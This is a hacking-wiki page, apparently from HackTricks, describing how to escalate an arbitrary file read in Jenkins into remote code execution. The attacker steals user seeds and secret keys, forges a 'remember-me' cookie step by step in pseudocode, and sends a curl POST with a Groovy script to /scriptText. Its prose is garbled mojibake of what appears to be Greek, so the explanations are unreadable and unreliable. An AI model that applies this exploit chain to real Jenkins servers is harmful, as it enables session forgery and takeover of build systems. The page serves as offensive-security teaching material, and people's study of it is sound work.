# Jenkins Arbitrary File Read to RCE via "Remember Me"

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ· blog ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î· ÎµÏÏÎµÏƒÎ· ÎµÎ½ÏŒÏ‚ ÎµÎ¾Î±Î¹ÏÎµÏ„Î¹ÎºÎ¿Ï Ï„ÏÏŒÏ€Î¿Ï… Î³Î¹Î± Î½Î± Î¼ÎµÏ„Î±Ï„ÏÎ±Ï€ÎµÎ¯ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Local File Inclusion ÏƒÏ„Î¿ Jenkins ÏƒÎµ RCE: [https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/](https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/)

Î‘Ï…Ï„Î® ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Ï€ÎµÏÎ¯Î»Î·ÏˆÎ· Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎµ Î±Ï€ÏŒ AI Ï„Î¿Ï… Î¼Î­ÏÎ¿Ï…Ï‚ Ï„Î·Ï‚ Î±Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ ÏŒÏ€Î¿Ï… Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎµÎ½ÏŒÏ‚ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿Ï… cookie ÎºÎ±ÎºÎ¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ RCE ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î· Î¼Î¹Î± Ï„Î¿Ï€Î¹ÎºÎ® Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î¼Î­Ï‡ÏÎ¹ Î½Î± Î­Ï‡Ï‰ Ï‡ÏÏŒÎ½Î¿ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ‰ Î¼Î¹Î± Ï€ÎµÏÎ¯Î»Î·ÏˆÎ· Î¼ÏŒÎ½Î¿Ï‚ Î¼Î¿Ï…:

### Attack Prerequisites

* **Feature Requirement:** "Remember me" Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ (Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· ÏÏÎ¸Î¼Î¹ÏƒÎ·).
* **Access Levels:** ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Overall/Read.
* **Secret Access:** Î”Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î±Î½Î¬Î³Î½Ï‰ÏƒÎ·Ï‚ Ï„ÏŒÏƒÎ¿ Î´Ï…Î±Î´Î¹ÎºÎ¿Ï ÏŒÏƒÎ¿ ÎºÎ±Î¹ ÎºÎµÎ¹Î¼ÎµÎ½Î¹ÎºÎ¿Ï Ï€ÎµÏÎ¹ÎµÏ‡Î¿Î¼Î­Î½Î¿Ï… Î±Ï€ÏŒ Î²Î±ÏƒÎ¹ÎºÎ¬ Î±ÏÏ‡ÎµÎ¯Î±.

### Detailed Exploitation Process

#### Step 1: Data Collection

**User Information Retrieval**

* Î ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Ï‡ÏÎ·ÏƒÏ„ÏÎ½ ÎºÎ±Î¹ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Î±Ï€ÏŒ Ï„Î¿ `$JENKINS_HOME/users/*.xml` Î³Î¹Î± ÎºÎ¬Î¸Îµ Ï‡ÏÎ®ÏƒÏ„Î· Î³Î¹Î± Î½Î± ÏƒÏ…Î³ÎºÎµÎ½Ï„ÏÏ‰Î¸Î¿ÏÎ½:
* **Username**
* **User seed**
* **Timestamp**
* **Password hash**

**Secret Key Extraction**

* Î•Î¾Î±Î³Ï‰Î³Î® ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î¹ÎºÏÎ½ ÎºÎ»ÎµÎ¹Î´Î¹ÏÎ½ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± Ï„Î·Î½ Ï…Ï€Î¿Î³ÏÎ±Ï†Î® Ï„Î¿Ï… cookie:
* **Secret Key:** `$JENKINS_HOME/secret.key`
* **Master Key:** `$JENKINS_HOME/secrets/master.key`
* **MAC Key File:** `$JENKINS_HOME/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac`

#### Step 2: Cookie Forging

**Token Preparation**

*   **Calculate Token Expiry Time:**

{% code overflow="wrap" %}
```javascript
tokenExpiryTime = currentServerTimeInMillis() + 3600000  // Î ÏÎ¿ÏƒÎ¸Î­Ï„ÎµÎ¹ Î¼Î¯Î± ÏÏÎ± ÏƒÏ„Î·Î½ Ï„ÏÎ­Ï‡Î¿Ï…ÏƒÎ± ÏÏÎ±
```
{% endcode %}
*   **Concatenate Data for Token:**

{% code overflow="wrap" %}
```javascript
token = username + ":" + tokenExpiryTime + ":" + userSeed + ":" + secretKey
```
{% endcode %}

**MAC Key Decryption**

*   **Decrypt MAC Key File:**

```javascript
key = toAes128Key(masterKey)  // ÎœÎµÏ„Î±Ï„ÏÎ¿Ï€Î® Ï„Î¿Ï… master key ÏƒÎµ Î¼Î¿ÏÏ†Î® ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï AES128
decrypted = AES.decrypt(macFile, key)  // Î‘Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· Ï„Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï… .mac
if not decrypted.hasSuffix("::::MAGIC::::")
return ERROR;
macKey = decrypted.withoutSuffix("::::MAGIC::::")
```

**Signature Computation**

*   **Compute HMAC SHA256:**

```javascript
mac = HmacSHA256(token, macKey)  // Î¥Ï€Î¿Î»Î¿Î³Î¹ÏƒÎ¼ÏŒÏ‚ HMAC Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ token ÎºÎ±Î¹ Ï„Î¿ MAC key
tokenSignature = bytesToHexString(mac)  // ÎœÎµÏ„Î±Ï„ÏÎ¿Ï€Î® Ï„Î¿Ï… MAC ÏƒÎµ Î´ÎµÎºÎ±ÎµÎ¾Î±Î´Î¹ÎºÎ® ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬
```

**Cookie Encoding**

*   **Generate Final Cookie:**

{% code overflow="wrap" %}
```javascript
cookie = base64.encode(username + ":" + tokenExpiryTime + ":" + tokenSignature)  // Base64 ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ cookie
```
{% endcode %}

#### Step 3: Code Execution

**Session Authentication**

* **Fetch CSRF and Session Tokens:**
* ÎšÎ¬Î½Ï„Îµ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± ÏƒÏ„Î¿ `/crumbIssuer/api/json` Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿ `Jenkins-Crumb`.
* Î£Ï…Î»Î»Î­Î¾Ï„Îµ Ï„Î¿ `JSESSIONID` Î±Ï€ÏŒ Ï„Î·Î½ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÏƒÎµ ÏƒÏ…Î½Î´Ï…Î±ÏƒÎ¼ÏŒ Î¼Îµ Ï„Î¿ cookie "remember-me".

**Command Execution Request**

*   **Send a POST Request with Groovy Script:**

```bash
curl -X POST "$JENKINS_URL/scriptText" \
--cookie "remember-me=$REMEMBER_ME_COOKIE; JSESSIONID...=$JSESSIONID" \
--header "Jenkins-Crumb: $CRUMB" \
--header "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "script=$SCRIPT"
```

* Î¤Î¿ Groovy script Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½Ï„Î¿Î»ÏÎ½ ÏƒÎµ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ Î® Î¬Î»Î»Ï‰Î½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÏÎ½ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ Ï„Î¿Ï… Jenkins.

Î— Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î¿Ï‚ curl ÎµÎ½Ï„Î¿Î»Î® Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡ÎµÏ„Î±Î¹ Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ Ï€ÏÏ‚ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± ÏƒÏ„Î¿ Jenkins Î¼Îµ Ï„Î¹Ï‚ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„ÎµÏ‚ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚ ÎºÎ±Î¹ cookies Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ ÎºÏÎ´Î¹ÎºÎ± Î¼Îµ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
